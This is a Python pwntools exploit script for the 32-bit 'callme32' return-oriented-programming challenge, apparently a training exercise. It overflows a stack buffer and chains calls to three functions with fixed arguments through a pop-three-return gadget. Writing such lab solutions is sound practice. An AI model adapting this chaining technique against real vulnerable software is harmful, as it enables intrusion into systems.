from pwn import *

exe = context.binary = ELF('./callme32')
p = process('./callme32')

offset = 0x2c

def push_args(args, payload):
    for i in args:
        payload += p32(i)

    return payload

pop3ret = 0x080487f9
args = [0xdeadbeef, 0xcafebabe, 0xd00df00d]

callme_one = 0x080484f0
callme_two = 0x08048550
callme_three = 0x080484e0

payload = b'A'*offset
payload += p32(callme_one)
payload += p32(pop3ret)
payload = push_args(args, payload)
payload += p32(callme_two)
payload += p32(pop3ret)
payload = push_args(args, payload)
payload += p32(callme_three)
payload += p32(pop3ret)
payload = push_args(args, payload)

with open("payload.bin", 'wb') as f:
    f.write(payload)

# interactive part
p.recvuntil(b'> ')
p.sendline(payload)
p.interactive()
